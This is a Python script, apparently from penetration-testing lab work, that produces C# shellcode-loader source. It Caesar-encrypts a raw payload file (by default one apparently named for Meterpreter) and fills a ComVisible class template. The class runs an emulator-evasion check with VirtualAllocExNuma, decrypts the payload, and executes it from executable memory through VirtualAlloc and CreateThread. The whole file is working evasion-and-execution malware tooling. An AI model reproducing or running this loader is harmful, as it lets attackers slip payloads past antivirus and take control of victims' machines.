from common.shellcode_formator import to_csharp_array
from common.encrypt_utils import EncryptUtils, Algorithm, Language
import sys

template = """
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    static byte[] DecryptShellcode(byte[] enc, uint key)
    {
        byte[] buf = new byte[enc.Length];
        for (int i = 0; i < enc.Length; i++)
        {
            buf[i] = (byte)(((uint)enc[i] - key) & 0xFF);
        }
        return buf;
    }

    public TestClass()
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }
        byte[] encryptedShellcode = %(encrypted_shellcode)s;
        byte[] buf = DecryptShellcode(encryptedShellcode, %(decryption_key)s);
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"""


def read_shellcode_file(shellcode_fp):
    with open(shellcode_fp, 'rb') as f:
        return f.read()


def get_code(shellcode_fp, key):
    shellcode = read_shellcode_file(shellcode_fp)
    enc_utils = EncryptUtils(Algorithm.CAESAR, key)
    encrypted_shellcode = enc_utils.encrypt(shellcode)
    code = template % {'decryption_key': str(key),'encrypted_shellcode': to_csharp_array(encrypted_shellcode)}
    print(code)


shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(shellcode_path, key)
